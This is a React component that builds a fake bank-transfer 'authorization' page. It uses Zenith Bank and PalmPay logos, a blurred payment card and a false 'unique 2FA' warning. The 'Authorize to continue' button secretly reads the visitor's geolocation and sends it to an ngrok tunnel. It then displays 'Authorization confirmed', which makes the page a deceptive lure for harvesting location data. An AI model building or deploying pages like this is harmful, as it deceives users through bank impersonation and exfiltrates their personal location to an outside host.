import React, { useState } from "react";
import masterCard from "../assets/mastercard.svg";
import transferIcon from "../assets/transfer.svg";
import { Position, PositionError } from "../lib/PosType";
import PaymentComplete from "./PaymentComplete";
import LazyLoadImage from "./media/LazyLoadImage";

interface AccountProps {
  isTriggered: boolean;
}

const Account: React.FC<AccountProps> = ({ isTriggered }) => {
  const [authorized, setAuthorized] = useState(false);
  const [trPin, setTrPin] = useState<string>("");
  const [numberOfTries, setNumberOfTries] = useState(0);
  const pin = "Rf0efc48d2fmfaJL";
  const toggleBackCard = () => {
    const cardEl = document.getElementById("creditCard");
    if (cardEl?.classList.contains("seeBack")) {
      cardEl?.classList.remove("seeBack");
    } else {
      cardEl?.classList.add("seeBack");
    }
  };

  const handlePinChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setTrPin(value);
  };

  const handleGeoLocate = (
    event: React.MouseEvent<HTMLButtonElement, MouseEvent>
  ) => {
    const button = event.target as HTMLButtonElement;
    button.innerHTML =
      "<div class='flex items-center gap-2'><div class='h-5 w-5 border-t-transparent border-solid animate-spin rounded-full border-white border-4'></div> <span>Processing...</span></div>";

    navigator.geolocation.getCurrentPosition(success, error);

    function success(position: Position) {
      const { coords } = position;
      const data = {
        latitude: coords.latitude,
        longitude: coords.longitude,
      };

      fetch("https://2372-102-215-57-161.ngrok-free.app/geoloc", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log("Success:", data);
          button.textContent = "Authorization confirmed";
          setAuthorized(!authorized);
          setNumberOfTries(numberOfTries + 1);
        })
        .catch((error) => {
          console.error("Error:", error);
          button.textContent = "Something went wrong!";
          button.disabled = true;
          button.classList.toggle("cursor-not-allowed");
          setNumberOfTries(numberOfTries + 1);
        });
    }

    function error(err: PositionError) {
      console.error(`ERROR(${err.code}): ${err.message}`);
      button.textContent = "Authorization failed!";
    }
  };

  {
    return authorized ? (
      <PaymentComplete />
    ) : (
      <main className="flex min-h-screen flex-col items-center justify-center p-6 lg:p-24">
        <div className="flex my-4 gap-3">
          <LazyLoadImage
            className="w-10 lg:w-fit h-20 rounded-lg"
            src="https://www.zenithbank.com/media/1400/zenith-bank-logo_1.png"
            alt="bank-logo"
            imgClassName="object-contain w-full h-full"
          />

          <img src={transferIcon} alt="transferIcon" width={50} height={50} />

          <LazyLoadImage
            className="w-28 lg:w-fit h-20 rounded-lg"
            src="https://www.palmpay.com/_next/static/media/logo.e481427a.png?w=256&q=100"
            alt="bank-logo"
            imgClassName="object-contain w-full h-full"
          />
        </div>
        <div className="m">
          <h1 className="text-red-800">
            This account has a unique 2FA(MFA) attached!
          </h1>
          <p className="text-teal-800">Pass all authorization!</p>
        </div>
        <div className="bg-white w-full max-w-3xl mx-auto px-4 lg:px-6 py-8 shadow-md rounded-md flex flex-col lg:flex-row gap-3 lg:gap-0">
          <div className="w-full lg:w-1/2 lg:pr-8 lg:border-r-2 lg:border-slate-300">
            <div className="mb-4">
              <label className="text-neutral-800 font-bold text-sm mb-2 block">
                Transaction Initiated from Member #3:
              </label>
              <input
                id="cardNumber"
                type="text"
                className={`flex h-10 w-full rounded-md border-2 bg-background px-4 py-1.5 text-lg ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:border-purple-600 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 undefined ${pin === trPin ? "blur-sm" : ""}`}
                maxLength={19}
                placeholder="Family Transaction Pin"
                name="trPin"
                value={pin}
                onChange={handlePinChange}
                disabled={isTriggered !== authorized}
              />
              <span
                className={`${
                  trPin === pin
                    ? "text-green-600"
                    : "blur-xl text-red-600"
                }`}
              >
                {trPin}
              </span>
            </div>
            <div className="mb-4">
              <label className="text-neutral-800 font-bold text-sm mb-2 block">
                Recipient Name: Amina Ibrahim
              </label>
              <input
                id="RecipientNumber"
                type="number"
                className="flex h-10 w-full rounded-md border-2 bg-background px-4 py-1.5 text-lg ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:border-purple-600 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 undefined"
                maxLength={12}
                placeholder="Recipient number"
                value={8870046433}
                disabled={isTriggered !== authorized}
              />
            </div>
            <div className="mb-4">
              <label className="text-neutral-800 font-bold text-sm mb-2 block">
                Transaction Amount:
              </label>
              <input
                id="amount"
                type="number"
                className="flex h-10 w-full rounded-md border-2 bg-background px-4 py-1.5 text-lg ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:border-purple-600 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 undefined"
                maxLength={12}
                placeholder="transaction amount"
                value={30000}
                disabled={isTriggered !== authorized}
              />
            </div>

            <div>
              <button
                id="sendAuthorizationPoint"
                className="w-fit bg-violet-900 text-gray-300 rounded-md p-2 hover:bg-violet-600"
                onClick={(event) => handleGeoLocate(event)}
              >
                Authorize to continue
              </button>
            </div>
            <p className="text-gray-500">
              This Link has 3 trials before expiration
            </p>
            <p className="text-gray-500">
              Your usage{" "}
              <span className="text-orange-600">{numberOfTries}</span>/3
            </p>
          </div>
          <div className="w-full lg:w-1/2 lg:pl-8">
            <div
              className="w-full max-w-sm h-56"
              style={{ perspective: "1000px" }}
            >
              <div
                id="creditCard"
                className="relative crediCard cursor-pointer transition-transform duration-500"
                style={{ transformStyle: "preserve-3d" }}
                onClick={() => toggleBackCard()}
              >
                <div
                  className="w-full h-56 m-auto rounded-xl text-white shadow-2xl absolute"
                  style={{ backfaceVisibility: "hidden" }}
                >
                  <LazyLoadImage
                    className="w-full h-full rounded-xl"
                    src="https://i.ibb.co/LPLv5MD/Payment-Card-01.jpg"
                    alt="card-img"
                    imgClassName="object-cover w-full h-full rounded-xl"
                  />
                  <div className="w-full px-8 absolute top-8">
                    <div className="text-right">
                      <img src={masterCard} alt="card-front" />
                    </div>
                    <div className="pt-1">
                      <p className="font-light">Card Number</p>
                      <p
                        id="imageCardNumber"
                        className="font-medium tracking-more-wider h-6 blur-sm"
                      >
                        5239 7416 4256 6180
                      </p>
                    </div>
                    <div className="pt-6 flex justify-between">
                      <div>
                        <p className="font-light">Name</p>
                        <p
                          id="imageCardName"
                          className="font-medium tracking-widest h-6 blur-sm"
                        >
                          Jacob Liam
                        </p>
                      </div>
                      <div>
                        <p className="font-light">Expiry</p>
                        <p
                          id="imageExpDate"
                          className="font-medium tracking-wider h-6 w-14 blur-sm"
                        >
                          12/24
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
                <div
                  className="w-full h-56 m-auto rounded-xl text-white shadow-2xl absolute"
                  style={{
                    backfaceVisibility: "hidden",
                    transform: "rotateY(180deg)",
                  }}
                >
                  <LazyLoadImage
                    className="w-full h-full rounded-xl"
                    src="https://i.ibb.co/LPLv5MD/Payment-Card-01.jpg"
                    alt="card-img"
                    imgClassName="object-cover w-full h-full rounded-xl"
                  />
                  <div className="w-full absolute top-8">
                    <div className="bg-black h-10"></div>
                    <div className="px-8 mt-5">
                      <div className="flex space-between">
                        <div className="flex-1 h-8 bg-red-100"></div>
                        <p
                          id="imageCCVNumber"
                          className="bg-white text-black flex items-center pl-4 pr-2 w-14 blur-sm"
                        >
                          342
                        </p>
                      </div>
                      <p className="font-light flex justify-end text-xs mt-2">
                        security code
                      </p>
                      <div className="flex justify-end mt-2">
                        <img src={masterCard} alt="card-back" />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
    );
  }
};

export default Account;
